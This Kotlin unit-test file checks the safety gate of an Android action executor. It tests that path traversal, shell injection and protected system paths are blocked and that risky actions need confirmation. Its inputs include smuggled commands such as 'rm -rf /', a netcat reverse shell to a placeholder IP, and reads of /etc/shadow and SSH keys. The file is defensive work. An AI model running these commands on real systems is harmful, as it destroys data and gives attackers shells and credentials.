package com.silentexec.android

import com.silentexec.android.core.ActionCommand
import com.silentexec.android.core.ActionJson
import com.silentexec.android.core.ActionType
import com.silentexec.android.core.Platform
import com.silentexec.android.core.SafetyDecision
import com.silentexec.android.core.SafetyGate
import kotlinx.serialization.SerializationException
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class CoreSafetyTest {

    @Test
    fun test01_allTwentyActionsDeserialization() {
        val actions = listOf(
            "open_folder", "open_file", "launch_app", "search_files",
            "set_volume", "set_brightness", "create_note", "copy_to_clipboard",
            "delete_file", "move_file", "system_power", "open_android_app",
            "toggle_setting", "send_message", "open_url",
            "ui_click", "ui_type", "ui_scroll", "ui_back", "ui_home", "done",
            "reply", "read_file", "write_file", "memory_save", "web_fetch"
        )

        assertEquals(26, ActionType.values().size)

        for (action in actions) {
            val json = """
                {
                    "action": "$action",
                    "target": "test_target",
                    "platform": "android",
                    "confidence": 0.95
                }
            """.trimIndent()

            val cmd = ActionJson.fromJson(json)
            assertEquals(action, cmd.action.wireName)
            assertEquals(Platform.ANDROID, cmd.platform)
            assertEquals(0.95, cmd.confidence, 0.001)
        }
    }

    @Test(expected = SerializationException::class)
    fun test02_unknownFieldRejection() {
        val jsonWithUnknownField = """
            {
                "action": "open_url",
                "target": "https://example.com",
                "platform": "android",
                "confidence": 0.95,
                "unexpected_field": "exploit"
            }
        """.trimIndent()

        // Strict deserialization must reject unknown keys (strict parity with Rust deny_unknown_fields)
        ActionJson.fromJson(jsonWithUnknownField)
    }

    @Test
    fun test03_arabicTargetDeserialization() {
        val jsonArabic = """
            {
                "action": "open_file",
                "target": "تقرير_التخرج_النهائي.pdf",
                "folder": "المستندات",
                "platform": "android",
                "confidence": 0.98
            }
        """.trimIndent()

        val cmd = ActionJson.fromJson(jsonArabic)
        assertEquals(ActionType.OPEN_FILE, cmd.action)
        assertEquals("تقرير_التخرج_النهائي.pdf", cmd.target)
        assertEquals("المستندات", cmd.folder)
    }

    @Test
    fun test04_pathTraversalTargetBlocked() {
        val cmd = ActionCommand(
            action = ActionType.OPEN_FILE,
            target = "../../../etc/passwd",
            platform = Platform.ANDROID,
            confidence = 0.95
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.Block)
        val reason = (decision as SafetyDecision.Block).reason
        assertTrue(reason.contains("Path traversal"))
    }

    @Test
    fun test05_pathTraversalFolderBlocked() {
        val cmd = ActionCommand(
            action = ActionType.OPEN_FOLDER,
            target = "Documents",
            folder = "..\\..\\Windows",
            platform = Platform.ANDROID,
            confidence = 0.95
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.Block)
        val reason = (decision as SafetyDecision.Block).reason
        assertTrue(reason.contains("Path traversal"))
    }

    @Test
    fun test06_shellInjectionAmpersandBlocked() {
        val cmd = ActionCommand(
            action = ActionType.OPEN_FILE,
            target = "test.txt && rm -rf /",
            platform = Platform.ANDROID,
            confidence = 0.95
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.Block)
        val reason = (decision as SafetyDecision.Block).reason
        assertTrue(reason.contains("Shell injection"))
    }

    @Test
    fun test07_shellInjectionPipeBlocked() {
        val cmd = ActionCommand(
            action = ActionType.LAUNCH_APP,
            target = "Terminal | nc -e /bin/sh 1.2.3.4 4444",
            platform = Platform.ANDROID,
            confidence = 0.90
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.Block)
        val reason = (decision as SafetyDecision.Block).reason
        assertTrue(reason.contains("Shell injection"))
    }

    @Test
    fun test08_shellInjectionSubshellAndBacktickBlocked() {
        val cmdSubshell = ActionCommand(
            action = ActionType.OPEN_URL,
            target = "http://example.com/$(whoami)",
            platform = Platform.ANDROID,
            confidence = 0.90
        )
        val decision1 = SafetyGate.evaluate(cmdSubshell)
        assertTrue(decision1 is SafetyDecision.Block)

        val cmdBacktick = ActionCommand(
            action = ActionType.OPEN_URL,
            target = "http://example.com/`id`",
            platform = Platform.ANDROID,
            confidence = 0.90
        )
        val decision2 = SafetyGate.evaluate(cmdBacktick)
        assertTrue(decision2 is SafetyDecision.Block)
    }

    @Test
    fun test09_protectedSystemPathBlocked() {
        val paths = listOf(
            "/system/bin/sh",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\cmd.exe",
            "c:/program files/sensitive"
        )

        for (path in paths) {
            val cmd = ActionCommand(
                action = ActionType.OPEN_FILE,
                target = path,
                platform = Platform.ANDROID,
                confidence = 0.95
            )
            val decision = SafetyGate.evaluate(cmd)
            assertTrue(decision is SafetyDecision.Block)
            val reason = (decision as SafetyDecision.Block).reason
            assertTrue(reason.contains("Access to protected system path"))
        }
    }

    @Test
    fun test10_tier2ActionsRequireConfirmation() {
        val tier2Actions = listOf(
            ActionType.DELETE_FILE,
            ActionType.MOVE_FILE,
            ActionType.SYSTEM_POWER,
            ActionType.TOGGLE_SETTING,
            ActionType.SEND_MESSAGE
        )

        for (action in tier2Actions) {
            val cmd = ActionCommand(
                action = action,
                target = "sample_target",
                platform = Platform.ANDROID,
                confidence = 0.99
            )
            val decision = SafetyGate.evaluate(cmd)
            assertTrue("Action ${action.wireName} must require confirmation", decision is SafetyDecision.RequireConfirm)
            val reason = (decision as SafetyDecision.RequireConfirm).reason
            assertTrue(reason.contains("Tier 2"))
        }
    }

    @Test
    fun test11_tier1ActionsAllowSilentWhenConfidenceHigh() {
        val tier1Actions = listOf(
            ActionType.OPEN_FOLDER,
            ActionType.OPEN_FILE,
            ActionType.LAUNCH_APP,
            ActionType.SEARCH_FILES,
            ActionType.SET_VOLUME,
            ActionType.SET_BRIGHTNESS,
            ActionType.CREATE_NOTE,
            ActionType.COPY_TO_CLIPBOARD,
            ActionType.OPEN_ANDROID_APP,
            ActionType.OPEN_URL
        )

        for (action in tier1Actions) {
            val cmd = ActionCommand(
                action = action,
                target = "valid_target",
                platform = Platform.ANDROID,
                confidence = 0.85
            )
            val decision = SafetyGate.evaluate(cmd)
            assertEquals("Action ${action.wireName} should allow silent execution", SafetyDecision.AllowSilent, decision)
        }
    }

    @Test
    fun test12_lowConfidenceDowngradeToRequireConfirm() {
        val cmd = ActionCommand(
            action = ActionType.SET_BRIGHTNESS,
            target = "80",
            platform = Platform.ANDROID,
            confidence = 0.60 // below 0.65 threshold
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.RequireConfirm)
        val reason = (decision as SafetyDecision.RequireConfirm).reason
        assertTrue(reason.contains("below the 0.65 threshold"))
    }

    @Test
    fun test12b_tier1OpenUrlConfidence055DoesNotTriggerFalseConfirmation() {
        val cmd = ActionCommand(
            action = ActionType.OPEN_URL,
            target = "https://www.youtube.com/results?search_query=nlp",
            platform = Platform.ANDROID,
            confidence = 0.55
        )
        val decision = SafetyGate.evaluate(cmd)
        assertEquals(SafetyDecision.AllowSilent, decision)
    }

    @Test
    fun test12c_tier2DeleteFileStillRequiresConfirmation() {
        val cmd = ActionCommand(
            action = ActionType.DELETE_FILE,
            target = "notes.txt",
            platform = Platform.ANDROID,
            confidence = 0.99
        )
        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.RequireConfirm)
    }

    @Test
    fun test13_boundaryConfidenceThresholdAllowsSilent() {
        val cmd = ActionCommand(
            action = ActionType.OPEN_ANDROID_APP,
            target = "WhatsApp",
            platform = Platform.ANDROID,
            confidence = 0.65 // exactly at threshold
        )

        val decision = SafetyGate.evaluate(cmd)
        assertEquals(SafetyDecision.AllowSilent, decision)
    }

    @Test(expected = IllegalArgumentException::class)
    fun test14_outOfBoundsConfidenceRejected() {
        ActionCommand(
            action = ActionType.OPEN_URL,
            target = "https://example.com",
            platform = Platform.ANDROID,
            confidence = 1.25 // invalid
        )
    }

    @Test
    fun test15_argsBlockedPatternDetection() {
        val maliciousArgs = buildJsonObject {
            put("param", "normal_value; rm -rf /")
        }

        val cmd = ActionCommand(
            action = ActionType.LAUNCH_APP,
            target = "Settings",
            args = maliciousArgs,
            platform = Platform.ANDROID,
            confidence = 0.95
        )

        val decision = SafetyGate.evaluate(cmd)
        assertTrue(decision is SafetyDecision.Block)
        val reason = (decision as SafetyDecision.Block).reason
        assertTrue(reason.contains("Shell injection"))
    }
}
